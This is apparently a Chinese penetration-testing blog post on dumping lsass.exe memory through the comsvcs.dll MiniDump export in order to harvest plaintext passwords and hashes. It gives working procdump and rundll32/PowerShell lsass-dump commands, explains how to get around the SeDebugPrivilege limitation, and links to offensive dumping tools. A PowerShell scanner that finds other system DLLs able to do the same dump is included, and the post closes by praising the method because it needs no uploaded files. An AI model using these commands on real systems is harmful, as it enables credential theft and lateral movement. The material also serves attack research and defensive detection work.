@@ -1,0 +1,248 @@
+I"�,<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>最近学习了odzhan文章中介绍的一个技巧，使用C:\windows\system32\comsvcs.dll的导出函数MiniDump能够dump指定进程的内存文件。</p>
+
+<p>文章地址：</p>
+
+<p>https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/</p>
+
+<p>本文将要结合自己的经验，补充在测试过程中需要注意的地方，扩展方法，分析利用思路。编写powershell脚本，实现自动化扫描系统目录下所有dll的导出函数，查看是否存在其他可用的dll，介绍脚本实现的细节。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>dump指定进程内存文件的常用方法</li>
+  <li>使用comsvcs.dll实现dump指定进程内存文件的方法</li>
+  <li>编写脚本实现自动化扫描dll的导出函数</li>
+  <li>利用分析</li>
+</ul>
+
+<h2 id="0x02-dump指定进程内存文件的常用方法">0x02 dump指定进程内存文件的常用方法</h2>
+<hr />
+
+<p>在渗透测试中，最常用的方法是通过dump进程lsass.exe，从中获得明文口令和hash</p>
+
+<p>在原理上都是使用API MiniDumpWriteDump，参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</p>
+
+<p>常用的实现方法如下：</p>
+
+<h3 id="1procdump">1.procdump</h3>
+
+<p>参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre></div></div>
+
+<h3 id="2c实现">2.c++实现</h3>
+
+<p>https://github.com/killswitch-GUI/minidump-lib</p>
+
+<h3 id="3powershell实现">3.powershell实现</h3>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</p>
+
+<h3 id="4c实现">4.c#实现</h3>
+
+<p>https://github.com/GhostPack/SharpDump</p>
+
+<h2 id="0x03-使用comsvcsdll实现dump指定进程内存文件的方法">0x03 使用comsvcs.dll实现dump指定进程内存文件的方法</h2>
+<hr />
+
+<p>odzhan在文中给出了三种方法</p>
+
+<h3 id="1通过rundll32">1.通过rundll32</h3>
+
+<p>示例参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full
+</code></pre></div></div>
+
+<p>示例中lsass.exe的pid为808</p>
+
+<p><strong>注：</strong></p>
+
+<p>此处需要注意权限的问题，在dump指定进程内存文件时，需要开启SeDebugPrivilege权限</p>
+
+<p>管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-2/2-1.png" alt="Alt text" /></p>
+
+<p>所以说，直接在cmd下执行rundll32的命令尝试dump指定进程内存文件时，由于无法开启SeDebugPrivilege权限，所以会失败</p>
+
+<p>这里给出我的一个解决方法：</p>
+
+<p>管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为Enabled，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-2/2-2.png" alt="Alt text" /></p>
+
+<p>所以，这里可以通过powershell执行rundll32的命令实现，示例命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full"
+</code></pre></div></div>
+
+<h3 id="2通过vbs实现">2.通过vbs实现</h3>
+
+<p>原文提供了完整的实现代码</p>
+
+<p>执行的参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript 1.vbs lsass.exe
+</code></pre></div></div>
+
+<p>vbs脚本首先开启SeDebugPrivilege权限，接着执行rundll32的命令，测试成功</p>
+
+<h3 id="3通过c实现">3.通过c实现</h3>
+
+<p>原文提供了完整的实现代码</p>
+
+<p>代码先开启SeDebugPrivilege权限，再调用comsvcs.dll的导出函数MiniDumpW，测试成功</p>
+
+<h2 id="0x04-编写脚本实现自动化扫描dll的导出函数">0x04 编写脚本实现自动化扫描dll的导出函数</h2>
+<hr />
+
+<p>学习完odzhan的文章以后，我产生了一个疑问：</p>
+
+<p>Windows系统目录下是否存在其他可用的dll？</p>
+
+<p>于是，我尝试通过脚本对系统目录下所有dll的导出函数进行筛选，查看是否包含导出函数MiniDumpW</p>
+
+<p>脚本实现上需要考虑以下两个问题：</p>
+
+<h3 id="1遍历指定目录获取所有dll">1.遍历指定目录，获取所有dll</h3>
+
+<p>遍历路径C:\windows的测试代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path 'C:\windows'  -ErrorAction SilentlyContinue )) 
+{
+    $file.PSPath
+}
+</code></pre></div></div>
+
+<p>由于存在多级目录，这里需要获得dll的绝对路径，而$file.PSPath的格式为<code class="language-plaintext highlighter-rouge">Microsoft.PowerShell.Core\FileSystem::C:\windows\RtlExUpd.dll</code>，实际路径需要去除前缀</p>
+
+<p>优化后的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path 'C:\windows'  -ErrorAction SilentlyContinue )) 
+{
+    $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
+}
+</code></pre></div></div>
+
+<h3 id="2获得指定dll的导出函数">2.获得指定dll的导出函数</h3>
+
+<p>这里可以参考https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</p>
+
+<p>在此基础上进行优化，实现整个流程的自动化处理</p>
+
+<p>完整代码已上传至GitHub，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/Get-AllExports.ps1</p>
+
+<p>对C:\Windows进行筛选的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ./Get-AllExports.ps1
+$Path = 'C:\Windows'
+ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path $Path  -ErrorAction SilentlyContinue )) 
+{
+#   $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
+    Get-Exports -DllPath $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
+}
+</code></pre></div></div>
+
+<p>测试系统：Win7x64</p>
+
+<p>部分结果：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] C:\windows\system32\comsvcs.dll--&gt;MiniDumpW
+[+] C:\windows\system32\dbghelp.dll--&gt;MiniDumpReadDumpStream
+[+] C:\windows\system32\dbghelp.dll--&gt;MiniDumpWriteDump
+[+] C:\Windows\Syswow64\comsvcs.dll--&gt;MiniDumpW
+[+] C:\Windows\Syswow64\dbghelp.dll--&gt;MiniDumpReadDumpStream
+[+] C:\Windows\Syswow64\dbghelp.dll--&gt;MiniDumpWriteDump
+[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll--&gt;MinidumpMode
+[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll--&gt;Minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll--&gt;minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll--&gt;MinidumpMode
+[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll--&gt;Minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll--&gt;minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll--&gt;MinidumpMode
+[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll--&gt;Minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll--&gt;minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll--&gt;MinidumpMode
+[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll--&gt;Minidumpmode
+[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll--&gt;minidumpmode
+[+] C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll--&gt;MiniDumpW
+[+] C:\Windows\winsxs\amd64_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_a6821d2940c2bcdc\dbghelp.dll--&gt;MiniDumpReadDumpStream
+[+] C:\Windows\winsxs\amd64_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_a6821d2940c2bcdc\dbghelp.dll--&gt;MiniDumpWriteDump
+[+] C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll--&gt;MiniDumpW
+[+] C:\Windows\winsxs\x86_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_4a6381a588654ba6\dbghelp.dll--&gt;MiniDumpReadDumpStream
+[+] C:\Windows\winsxs\x86_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_4a6381a588654ba6\dbghelp.dll--&gt;MiniDumpWriteDump
+</code></pre></div></div>
+
+<p>测试结果如下：</p>
+
+<h4 id="1对于不同结构的进程可用的dll不同">1.对于不同结构的进程，可用的dll不同</h4>
+
+<p>对于32位的进程，可以使用32位和64位的dll：</p>
+
+<ul>
+  <li>C:\windows\system32\comsvcs.dll</li>
+  <li>C:\Windows\Syswow64\comsvcs.dll</li>
+  <li>C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll</li>
+  <li>C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll</li>
+</ul>
+
+<p>对于64位的进程，可以使用64位的dll：</p>
+
+<ul>
+  <li>C:\windows\system32\comsvcs.dll</li>
+  <li>C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll</li>
+</ul>
+
+<p>无法使用32位的dll：</p>
+
+<ul>
+  <li>C:\Windows\Syswow64\comsvcs.dll</li>
+  <li>C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll</li>
+</ul>
+
+<h4 id="2dbghelpdll对应api-minidumpwritedump">2.dbghelp.dll对应API MiniDumpWriteDump</h4>
+
+<h4 id="3sosdll中的导出函数minidumpmode">3.SOS.dll中的导出函数minidumpmode</h4>
+
+<p>用于防止在使用minidump时执行非安全命令。0表示禁用这个功能，1表示启用。默认为0</p>
+
+<h2 id="0x05-利用分析">0x05 利用分析</h2>
+<hr />
+
+<p>如果想要dump指定进程的内存文件，可以使用新的方法，示例命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full"
+</code></pre></div></div>
+
+<p>其中comsvcs.dll可以替换为以下dll：</p>
+
+<ul>
+  <li>C:\Windows\Syswow64\comsvcs.dll</li>
+  <li>C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll</li>
+  <li>C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll</li>
+</ul>
+
+<p>这种方法的优点是不需要上传文件，使用系统默认包含的dll就可以实现</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文在odzhan文章的基础上，补充在测试过程中需要注意的地方，扩展方法，分析利用思路。编写powershell脚本，实现自动化扫描系统目录下所有dll的导出函数。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
